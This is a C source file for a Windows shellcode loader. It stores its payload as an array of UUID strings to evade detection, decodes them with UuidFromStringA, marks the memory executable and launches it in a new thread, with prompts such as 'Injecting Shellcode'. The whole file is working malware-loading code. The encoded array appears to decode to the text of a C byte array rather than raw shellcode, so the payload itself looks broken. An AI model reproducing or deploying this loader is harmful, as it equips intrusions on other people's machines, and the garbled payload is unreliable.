#include <Windows.h>
#include <stdio.h>


char* UuidArray[] = {
	"69736E75-6E67-6465-2063-686172206275", "205D5B66-203D-220A-5C78-66635C783438", "3338785C-785C-3465-5C78-66305C786538",
	"3063785C-785C-3030-5C78-30305C783030", "3134785C-785C-3135-5C78-34315C783530", "5C220A22-3578-5C32-7835-315C7835365C",
	"5C383478-3378-5C31-7864-325C7836355C", "5C383478-3878-5C62-7835-325C7836305C", "5C383478-3878-5C62-7835-32220A225C78",
	"785C3831-3834-785C-3862-5C7835325C78", "785C3032-3834-785C-3862-5C7837325C78", "785C3035-3834-785C-3066-5C7862375C78",
	"785C6134-6134-0A22-225C-7834645C7833", "63785C31-5C39-3478-385C-7833315C7863", "61785C30-5C63-3378-635C-7836315C7837",
	"30785C63-5C32-3278-635C-7832305C7834", "220A2231-785C-3163-5C78-63395C783064", "3134785C-785C-3130-5C78-63315C786532",
	"6465785C-785C-3235-5C78-34315C783531", "3834785C-785C-6238-5C78-3532220A225C", "5C303278-3878-5C62-7834-325C7833635C",
	"5C383478-3078-5C31-7864-305C7838625C", "5C303878-3878-5C38-7830-305C7830305C", "5C303078-3478-2238-0A22-5C7838355C78",
	"785C3063-3437-785C-3637-5C7834385C78", "785C3130-3064-785C-3530-5C7838625C78", "785C3834-3831-785C-3434-5C7838625C78",
	"0A223034-5C22-3278-305C-7834395C7830", "64785C31-5C30-6578-335C-7835365C7834", "66785C38-5C66-6378-395C-7834315C7838",
	"33785C62-5C34-3878-385C-783438220A22", "3130785C-785C-3664-5C78-34645C783331", "3963785C-785C-3834-5C78-33315C786330",
	"6361785C-785C-3134-5C78-63315C786339", "6430785C-785C-3134-220A-225C7830315C", "5C316378-3378-5C38-7865-305C7837355C",
	"5C316678-3478-5C63-7830-335C7834635C", "5C343278-3078-5C38-7834-355C7833395C", "22316478-220A-785C-3735-5C7864385C78",
	"785C3835-3434-785C-3862-5C7834305C78", "785C3432-3934-785C-3031-5C7864305C78", "785C3636-3134-785C-3862-5C783063220A",
	"34785C22-5C38-3478-345C-7838625C7834", "31785C30-5C63-3478-395C-7830315C7864", "34785C30-5C31-3878-625C-7830345C7838",
	"34785C38-5C38-3078-3122-0A225C786430", "3134785C-785C-3835-5C78-34315C783538", "6535785C-785C-3935-5C78-35615C783431",
	"3835785C-785C-3134-5C78-35395C783431", "6135785C-0A22-5C22-7834-385C7838335C", "5C636578-3278-5C30-7834-315C7835325C",
	"5C666678-6578-5C30-7835-385C7834315C", "5C393578-3578-5C61-7834-385C78386222", "785C220A-3231-785C-6539-5C7835375C78",
	"785C6666-6666-785C-6666-5C7835645C78", "785C3834-6162-785C-3031-5C7830305C78", "785C3030-3030-785C-3030-220A225C7830",
	"30785C30-5C30-3078-305C-7834385C7838", "38785C64-5C64-3078-315C-7830315C7830", "30785C30-5C30-3478-315C-7862615C7833",
	"38785C31-2262-220A-5C78-36665C783837", "6666785C-785C-3564-5C78-62625C786630", "3562785C-785C-3261-5C78-35365C783431",
	"6162785C-785C-3661-5C78-39355C786264", "5C220A22-3978-5C64-7866-665C7864355C", "5C383478-3878-5C33-7863-345C7832385C",
	"5C633378-3078-5C36-7837-635C7830615C", "5C303878-6678-5C62-7865-30220A225C78", "785C3537-3530-785C-6262-5C7834375C78",
	"785C3331-3237-785C-3666-5C7836615C78", "785C3030-3935-785C-3431-5C7838395C78", "785C6164-6666-0A22-225C-7864355C7836",
	"36785C33-5C31-3678-635C-7836335C7832", "36785C65-5C35-3778-385C-7836355C7830", "0A3B2230-9090-9090-9090-909090909090"
};

#define NumberOfElements 75


typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
	);


BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	PCSTR		Terminator = NULL;

	NTSTATUS	STATUS = NULL;

	// getting UuidFromStringA   address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// getting the real size of the shellcode (number of elements * 16 => original shellcode size)
	sBuffSize = NmbrOfElements * 16;
	// allocating mem, that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// loop through all the addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if failed ...
			printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		// tmp buffer will be used to point to where to write next (in the newly allocated memory)
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}


int main() {

	PBYTE       pDeobfuscatedPayload = NULL;
	SIZE_T      sDeobfuscatedSize = NULL;

	printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
	printf("[#] Press <Enter> To Decrypt ... ");
	getchar();

	printf("[i] Decrypting ...");
	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}
	printf("[+] DONE !\n");
	printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	printf("[#] Press <Enter> To Allocate ... ");
	getchar();
	PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
	memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return -1;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();
	if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return -1;
	}

	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}


